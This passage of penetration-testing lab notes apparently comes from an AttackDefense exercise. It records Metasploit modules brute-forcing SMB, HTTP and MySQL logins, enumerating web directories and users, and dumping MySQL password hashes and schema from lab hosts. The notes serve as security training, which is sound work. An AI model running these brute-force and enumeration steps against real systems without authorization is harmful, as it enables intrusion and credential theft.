[-] 192.46.115.3:445      - 192.46.115.3:445 - Failed: '.\admin:12345',
[-] 192.46.115.3:445      - 192.46.115.3:445 - Failed: '.\admin:123456789',
[+] 192.46.115.3:445      - 192.46.115.3:445 - Success: '.\admin:password'
[*] 192.46.115.3:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

root@attackdefense:~# smbclient -L \\\\192.46.115.3\\ -U admin
Enter WORKGROUP\admin's password:

        Sharename       Type      Comment
        ---------       ----      -------
        public          Disk
        john            Disk
        aisha           Disk
        emma            Disk
        everyone        Disk
        IPC$            IPC       IPC Service (samba.recon.lab)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        RECONLABS            SAMBA-RECON

root@attackdefense:~# smbclient \\\\192.46.115.3\\public -U admin
Enter WORKGROUP\admin's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  dev                                 D        0  Tue Nov 27 13:36:13 2018
  secret                              D        0  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 185733212 blocks available
smb: \> cd secret\
smb: \secret\> ls
  .                                   D        0  Tue Nov 27 13:36:13 2018
  ..                                  D        0  Tue Nov 27 13:36:13 2018
  flag                                N       33  Tue Nov 27 13:36:13 2018

                1981084628 blocks of size 1024. 185733356 blocks available
smb: \secret\> get flag
getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
```

### HTTP Enum

```bash
 search type:auxiliary name:http
```

```bash
msf5 > use auxiliary/scanner/http/http_version
msf5 auxiliary(scanner/http/http_version) > options

Module options (auxiliary/scanner/http/http_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.224.149.3    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf5 auxiliary(scanner/http/http_version) > run

[+] 192.224.149.3:80 Apache/2.4.18 (Ubuntu)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/http/http_version) > use auxiliary/scanner/http/http_header
msf5 auxiliary(scanner/http/http_header) > options

Module options (auxiliary/scanner/http/http_header):

   Name         Current Setting                                                        Required  Description
   ----         ---------------                                                        --------  -----------
   HTTP_METHOD  HEAD                                                                   yes       HTTP Method to use, HEAD or GET (Accepted: GET, HEAD)
   IGN_HEADER   Vary,Date,Content-Length,Connection,Etag,Expires,Pragma,Accept-Ranges  yes       List of headers to ignore, seperated by comma
   Proxies                                                                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       192.224.149.3                                                          yes       The target address range or CIDR identifier
   RPORT        80                                                                     yes       The target port (TCP)
   SSL          false                                                                  no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                                                                      yes       The URI to use
   THREADS      1                                                                      yes       The number of concurrent threads
   VHOST                                                                               no        HTTP server virtual host

msf5 auxiliary(scanner/http/http_header) > run

[+] 192.224.149.3:80     : CONTENT-TYPE: text/html
[+] 192.224.149.3:80     : LAST-MODIFIED: Wed, 27 Feb 2019 04:21:01 GMT
[+] 192.224.149.3:80     : SERVER: Apache/2.4.18 (Ubuntu)
[+] 192.224.149.3:80     : detected 3 headers
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/http/http_header) > use auxiliary/scanner/http/robots_txt
msf5 auxiliary(scanner/http/robots_txt) > options

Module options (auxiliary/scanner/http/robots_txt):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   PATH     /                yes       The test path to find robots.txt file
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS   192.224.149.3    yes       The target address range or CIDR identifier
   RPORT    80               yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   THREADS  1                yes       The number of concurrent threads
   VHOST                     no        HTTP server virtual host

msf5 auxiliary(scanner/http/robots_txt) > run

[*] [192.224.149.3] /robots.txt found
[+] Contents of Robots.txt:
# robots.txt for attackdefense
User-agent: test
# Directories
Allow: /webmail

User-agent: *
# Directories
Disallow: /data
Disallow: /secure

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/http/robots_txt) > use auxiliary/scanner/http/dir_scanner
msf5 auxiliary(scanner/http/dir_scanner) > options

Module options (auxiliary/scanner/http/dir_scanner):

   Name        Current Setting                                          Required  Description
   ----        ---------------                                          --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  no        Path of word dictionary to use
   PATH        /                                                        yes       The path  to identify files
   Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.224.149.3                                            yes       The target address range or CIDR identifier
   RPORT       80                                                       yes       The target port (TCP)
   SSL         false                                                    no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                                        yes       The number of concurrent threads
   VHOST                                                                no        HTTP server virtual host

msf5 auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 192.224.149.3
[+] Found http://192.224.149.3:80/cgi-bin/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/data/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/doc/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/downloads/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/icons/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/manual/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/secure/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/uploads/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/users/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/view/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/webadmin/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/web_app/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/webmail/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/webdb/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/webdav/ 200 (192.224.149.3)
[+] Found http://192.224.149.3:80/~admin/ 404 (192.224.149.3)
[+] Found http://192.224.149.3:80/~nobody/ 404 (192.224.149.3)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/http/dir_scanner) > use auxiliary/scanner/http/files_dir
msf5 auxiliary(scanner/http/files_dir) > options

Module options (auxiliary/scanner/http/files_dir):

   Name        Current Setting                                           Required  Description
   ----        ---------------                                           --------  -----------
   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_files.txt  no        Path of word dictionary to use
   EXT                                                                   no        Append file extension to use
   PATH        /                                                         yes       The path  to identify files
   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      192.224.149.3                                             yes       The target address range or CIDR identifier
   RPORT       80                                                        yes       The target port (TCP)
   SSL         false                                                     no        Negotiate SSL/TLS for outgoing connections
   THREADS     1                                                         yes       The number of concurrent threads
   VHOST                                                                 no        HTTP server virtual host

msf5 auxiliary(scanner/http/files_dir) > run

[*] Using code '404' as not found for files with extension .null
[*] Using code '404' as not found for files with extension .backup
[+] Found http://192.224.149.3:80/file.backup 200
[*] Using code '404' as not found for files with extension .bak
[*] Using code '404' as not found for files with extension .c
[+] Found http://192.224.149.3:80/code.c 200
[*] Using code '404' as not found for files with extension .cfg
[+] Found http://192.224.149.3:80/code.cfg 200
[*] Using code '404' as not found for files with extension .class
[*] Using code '404' as not found for files with extension .copy
[*] Using code '404' as not found for files with extension .conf
[*] Using code '404' as not found for files with extension .exe
[*] Using code '404' as not found for files with extension .html
[+] Found http://192.224.149.3:80/index.html 200
[*] Using code '404' as not found for files with extension .htm
[*] Using code '404' as not found for files with extension .ini
[*] Using code '404' as not found for files with extension .log
[*] Using code '404' as not found for files with extension .old
[*] Using code '404' as not found for files with extension .orig
[*] Using code '404' as not found for files with extension .php
[+] Found http://192.224.149.3:80/test.php 200
[*] Using code '404' as not found for files with extension .tar
[*] Using code '404' as not found for files with extension .tar.gz
[*] Using code '404' as not found for files with extension .tgz
[*] Using code '404' as not found for files with extension .tmp
[*] Using code '404' as not found for files with extension .temp
[*] Using code '404' as not found for files with extension .txt
```

```bash
msf5 auxiliary(scanner/http/files_dir) > use auxiliary/scanner/http/http_login
msf5 auxiliary(scanner/http/http_login) > options

Module options (auxiliary/scanner/http/http_login):

   Name              Current Setting                                                           Required  Description
   ----              ---------------                                                           --------  -----------
   AUTH_URI                                                                                    no        The URI to authenticate against (default:auto)
   BLANK_PASSWORDS   false                                                                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                     no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                     no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                     no        Add all users in the current database to the list
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt      no        File containing passwords, one per line
   Proxies                                                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   REQUESTTYPE       GET                                                                       no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
   RHOSTS            192.224.149.3                                                             yes       The target address range or CIDR identifier
   RPORT             80                                                                        yes       The target port (TCP)
   SSL               false                                                                     no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                     yes       Stop guessing when a credential works for a host
   THREADS           1                                                                         yes       The number of concurrent threads
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                     no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/http_default_users.txt     no        File containing users, one per line
   VERBOSE           true                                                                      yes       Whether to print output for all attempts
   VHOST                                                                                       no        HTTP server virtual host

msf5 auxiliary(scanner/http/http_login) > set AUTH_URI /secure/
AUTH_URI => /secure/
msf5 auxiliary(scanner/http/http_login) > unset USERPASS_FILE
Unsetting USERPASS_FILE...
msf5 auxiliary(scanner/http/http_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/namelist.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/namelist.txt
msf5 auxiliary(scanner/http/http_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/http/http_login) > set verbose false
verbose => false
msf5 auxiliary(scanner/http/http_login) > run

[*] Attempting to login to http://192.224.149.3:80/secure/

Fails
```

```bash
msf5 auxiliary(scanner/http/http_login) > use auxiliary/scanner/http/apache_userdir_enum
msf5 auxiliary(scanner/http/apache_userdir_enum) > options

Module options (auxiliary/scanner/http/apache_userdir_enum):

   Name              Current Setting                                                Required  Description
   ----              ---------------                                                --------  -----------
   BRUTEFORCE_SPEED  5                                                              yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                          no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                          no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                          no        Add all users in the current database to the list
   Proxies                                                                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.224.149.3                                                  yes       The target address range or CIDR identifier
   RPORT             80                                                             yes       The target port (TCP)
   SSL               false                                                          no        Negotiate SSL/TLS for outgoing connections
   TARGETURI         /                                                              yes       The path to users Home Page
   THREADS           1                                                              yes       The number of concurrent threads
   USERNAME                                                                         no        A specific username to authenticate as
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt  yes       File containing users, one per line
   VERBOSE           true                                                           yes       Whether to print output for all attempts
   VHOST                                                                            no        HTTP server virtual host

msf5 auxiliary(scanner/http/apache_userdir_enum) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt

msf5 auxiliary(scanner/http/apache_userdir_enum) > run

[*] http://192.224.149.3/~sysadmin - Trying UserDir: 'sysadmin'
[*] http://192.224.149.3/ - Apache UserDir: 'sysadmin' not found
[*] http://192.224.149.3/~rooty - Trying UserDir: 'rooty'
[+] http://192.224.149.3/ - Apache UserDir: 'rooty' found
[*] http://192.224.149.3/~demo - Trying UserDir: 'demo'
[*] http://192.224.149.3/ - Apache UserDir: 'demo' not found
[*] http://192.224.149.3/~auditor - Trying UserDir: 'auditor'
[*] http://192.224.149.3/ - Apache UserDir: 'auditor' not found
[*] http://192.224.149.3/~anon - Trying UserDir: 'anon'
[*] http://192.224.149.3/ - Apache UserDir: 'anon' not found
[*] http://192.224.149.3/~administrator - Trying UserDir: 'administrator'
[*] http://192.224.149.3/ - Apache UserDir: 'administrator' not found
[*] http://192.224.149.3/~diag - Trying UserDir: 'diag'
[*] http://192.224.149.3/ - Apache UserDir: 'diag' not found
[+] http://192.224.149.3/ - Users found: rooty
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf5 auxiliary(scanner/http/apache_userdir_enum) > use auxiliary/scanner/http/http_login
msf5 auxiliary(scanner/http/http_login) > options

Module options (auxiliary/scanner/http/http_login):

   Name              Current Setting                                                           Required  Description
   ----              ---------------                                                           --------  -----------
   AUTH_URI          /secure/                                                                  no        The URI to authenticate against (default:auto)
   BLANK_PASSWORDS   false                                                                     no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                         yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                                     no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                                     no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                                     no        Add all users in the current database to the list
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt         no        File containing passwords, one per line
   Proxies                                                                                     no        A proxy chain of format type:host:port[,type:host:port][...]
   REQUESTTYPE       GET                                                                       no        Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)
   RHOSTS            192.224.149.3                                                             yes       The target address range or CIDR identifier
   RPORT             80                                                                        yes       The target port (TCP)
   SSL               false                                                                     no        Negotiate SSL/TLS for outgoing connections
   STOP_ON_SUCCESS   false                                                                     yes       Stop guessing when a credential works for a host
   THREADS           1                                                                         yes       The number of concurrent threads
   USERPASS_FILE     /usr/share/metasploit-framework/data/wordlists/http_default_userpass.txt  no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                                     no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/namelist.txt               no        File containing users, one per line
   VERBOSE           false                                                                     yes       Whether to print output for all attempts
   VHOST                                                                                       no        HTTP server virtual host

msf5 auxiliary(scanner/http/http_login) > echo "rooty" > user.txt
[*] exec: echo "rooty" > user.txt

msf5 auxiliary(scanner/http/http_login) > set USER_FILE /root/user.txt
USER_FILE => /root/user.txt

msf5 auxiliary(scanner/http/http_login) > unset USERPASS_FILE
Unsetting USERPASS_FILE...

msf5 auxiliary(scanner/http/http_login) > run

[*] Attempting to login to http://192.224.149.3:80/secure/
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### MySQL Enum

```bash
msf5 > use auxiliary/scanner/mysql/mysql_version
msf5 auxiliary(scanner/mysql/mysql_version) > options

Module options (auxiliary/scanner/mysql/mysql_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.149.140.3    yes       The target address range or CIDR identifier
   RPORT    3306             yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads

msf5 auxiliary(scanner/mysql/mysql_version) > run

[+] 192.149.140.3:3306    - 192.149.140.3:3306 is running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)
[*] 192.149.140.3:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/mysql/mysql_writable_dirs) > use auxiliary/scanner/mysql/mysql_login
msf5 auxiliary(scanner/mysql/mysql_login) > options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS            192.149.140.3    yes       The target address range or CIDR identifier
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/mysql/mysql_login) > set VERBOSE false
VERBOSE => false

msf5 auxiliary(scanner/mysql/mysql_login) > run

[+] 192.149.140.3:3306    - 192.149.140.3:3306 - Success: 'root:twinkle'
[*] 192.149.140.3:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/mysql/mysql_login) > use auxiliary/admin/mysql/mysql_enum
msf5 auxiliary(admin/mysql/mysql_enum) > options

Module options (auxiliary/admin/mysql/mysql_enum):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        The password for the specified username
   RHOSTS    192.149.140.3    yes       The target address range or CIDR identifier
   RPORT     3306             yes       The target port (TCP)
   USERNAME                   no        The username to authenticate as

msf5 auxiliary(admin/mysql/mysql_enum) > set USERNAME root
USERNAME => root
msf5 auxiliary(admin/mysql/mysql_enum) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(admin/mysql/mysql_enum) > run
[*] Running module against 192.149.140.3

[*] 192.149.140.3:3306 - Running MySQL Enumerator...
[*] 192.149.140.3:3306 - Enumerating Parameters
[*] 192.149.140.3:3306 -        MySQL Version: 5.5.61-0ubuntu0.14.04.1
[*] 192.149.140.3:3306 -        Compiled for the following OS: debian-linux-gnu
[*] 192.149.140.3:3306 -        Architecture: x86_64
[*] 192.149.140.3:3306 -        Server Hostname: victim-1
[*] 192.149.140.3:3306 -        Data Directory: /var/lib/mysql/
[*] 192.149.140.3:3306 -        Logging of queries and logins: OFF
[*] 192.149.140.3:3306 -        Old Password Hashing Algorithm OFF
[*] 192.149.140.3:3306 -        Loading of local files: ON
[*] 192.149.140.3:3306 -        Deny logins with old Pre-4.1 Passwords: OFF
[*] 192.149.140.3:3306 -        Allow Use of symlinks for Database Files: YES
[*] 192.149.140.3:3306 -        Allow Table Merge:
[*] 192.149.140.3:3306 -        SSL Connection: DISABLED
[*] 192.149.140.3:3306 - Enumerating Accounts:
[*] 192.149.140.3:3306 -        List of Accounts with Password Hashes:
[+] 192.149.140.3:3306 -                User: root Host: localhost Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f Password Hash:
[+] 192.149.140.3:3306 -                User: root Host: 127.0.0.1 Password Hash:
[+] 192.149.140.3:3306 -                User: root Host: ::1 Password Hash:
[+] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost Password Hash: *F4E71A0BE028B3688230B992EEAC70BC598FA723
[+] 192.149.140.3:3306 -                User: root Host: % Password Hash: *A0E23B565BACCE3E70D223915ABF2554B2540144
[+] 192.149.140.3:3306 -                User: filetest Host: % Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
[+] 192.149.140.3:3306 -                User: ultra Host: localhost Password Hash: *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29
[+] 192.149.140.3:3306 -                User: guest Host: localhost Password Hash: *17FD2DDCC01E0E66405FB1BA16F033188D18F646
[+] 192.149.140.3:3306 -                User: gopher Host: localhost Password Hash: *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0
[+] 192.149.140.3:3306 -                User: backup Host: localhost Password Hash: *E6DEAD2645D88071D28F004A209691AC60A72AC9
[+] 192.149.140.3:3306 -                User: sysadmin Host: localhost Password Hash: *78A1258090DAA81738418E11B73EB494596DFDD3
[*] 192.149.140.3:3306 -        The following users have GRANT Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following users have CREATE USER Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following users have RELOAD Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following users have SHUTDOWN Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following users have SUPER Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following users have FILE Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -                User: filetest Host: %
[*] 192.149.140.3:3306 -        The following users have PROCESS Privilege:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following accounts have privileges to the mysql database:
[*] 192.149.140.3:3306 -                User: root Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -                User: debian-sys-maint Host: localhost
[*] 192.149.140.3:3306 -                User: root Host: %
[*] 192.149.140.3:3306 -        The following accounts have empty passwords:
[*] 192.149.140.3:3306 -                User: root Host: 891b50fafb0f
[*] 192.149.140.3:3306 -                User: root Host: 127.0.0.1
[*] 192.149.140.3:3306 -                User: root Host: ::1
[*] 192.149.140.3:3306 -        The following accounts are not restricted by source:
[*] 192.149.140.3:3306 -                User: filetest Host: %
[*] 192.149.140.3:3306 -                User: root Host: %
[*] Auxiliary module execution completed
```

```bash

msf5 auxiliary(admin/mysql/mysql_enum) > use auxiliary/admin/mysql/mysql_sql
msf5 auxiliary(admin/mysql/mysql_sql) > options

Module options (auxiliary/admin/mysql/mysql_sql):

   Name      Current Setting   Required  Description
   ----      ---------------   --------  -----------
   PASSWORD                    no        The password for the specified username
   RHOSTS    192.149.140.3     yes       The target address range or CIDR identifier
   RPORT     3306              yes       The target port (TCP)
   SQL       select version()  yes       The SQL to execute.
   USERNAME                    no        The username to authenticate as

msf5 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
msf5 auxiliary(admin/mysql/mysql_sql) > set PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 192.149.140.3

[*] 192.149.140.3:3306 - Sending statement: 'select version()'...
[*] 192.149.140.3:3306 -  | 5.5.61-0ubuntu0.14.04.1 |
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(admin/mysql/mysql_sql) > use auxiliary/scanner/mysql/mysql_schemadump
msf5 auxiliary(scanner/mysql/mysql_schemadump) > options

Module options (auxiliary/scanner/mysql/mysql_schemadump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DISPLAY_RESULTS  true             yes       Display the Results to the Screen
   PASSWORD                          no        The password for the specified username
   RHOSTS           192.149.140.3    yes       The target address range or CIDR identifier
   RPORT            3306             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads
   USERNAME                          no        The username to authenticate as

msf5 auxiliary(scanner/mysql/mysql_schemadump) > setg USERNAME root
USERNAME => root
msf5 auxiliary(scanner/mysql/mysql_schemadump) > setg PASSWORD twinkle
PASSWORD => twinkle
msf5 auxiliary(scanner/mysql/mysql_schemadump) > run

[+] 192.149.140.3:3306    - Schema stored in: /root/.msf4/loot/20240201131639_MySQL_192.149.140.3_mysql_schema_969013.txt
[+] 192.149.140.3:3306    - MySQL Server Schema
 Host: 192.149.140.3
 Port: 3306
 ====================

---
- DBName: upload
  Tables: []
- DBName: vendors
  Tables: []
- DBName: videos
  Tables: []
- DBName: warehouse
  Tables: []

[*] 192.149.140.3:3306    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```bash
msf5 auxiliary(scanner/mysql/mysql_schemadump) > hosts

Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
192.149.140.3             Unknown                    device

msf5 auxiliary(scanner/mysql/mysql_schemadump) > services
Services
========

host           port  proto  name   state  info
----           ----  -----  ----   -----  ----
192.149.140.3  3306  tcp    mysql  open   5.5.61-0ubuntu0.14.04.1

msf5 auxiliary(scanner/mysql/mysql_schemadump) > loot

Loot
====

host           service  type          name                            content     info          path
----           -------  ----          ----                            -------     ----          ----
192.149.140.3  mysql    mysql_schema  192.149.140.3_mysql_schema.txt  text/plain  MySQL Schema  /root/.msf4/loot/20240201131639_MySQL_192.149.140.3_mysql_schema_969013.txt

msf5 auxiliary(scanner/mysql/mysql_schemadump) > creds
Credentials
===========

host           origin         service           public            private                                    realm  private_type        JtR Format
----           ------         -------           ------            -------                                    -----  ------------        ----------
192.149.140.3  192.149.140.3  3306/tcp (mysql)  root                                                                Blank password
192.149.140.3  192.149.140.3  3306/tcp (mysql)  root              *A0E23B565BACCE3E70D223915ABF2554B2540144         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  root              twinkle                                           Password
192.149.140.3  192.149.140.3  3306/tcp (mysql)  debian-sys-maint  *F4E71A0BE028B3688230B992EEAC70BC598FA723         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  filetest          *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  ultra             *94BDCEBE19083CE2A1F959FD02F964C7AF4CFC29         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  guest             *17FD2DDCC01E0E66405FB1BA16F033188D18F646         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  gopher            *027ADC92DD1A83351C64ABCD8BD4BA16EEDA0AB0         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  backup            *E6DEAD2645D88071D28F004A209691AC60A72AC9         Nonreplayable hash  mysql,mysql-sha1
192.149.140.3  192.149.140.3  3306/tcp (mysql)  sysadmin          *78A1258090DAA81738418E11B73EB494596DFDD3         Nonreplayable hash  mysql,mysql-sha1
```


### SSH Enum

```bash
msf5 > use auxiliary/scanner/ssh/ssh_version
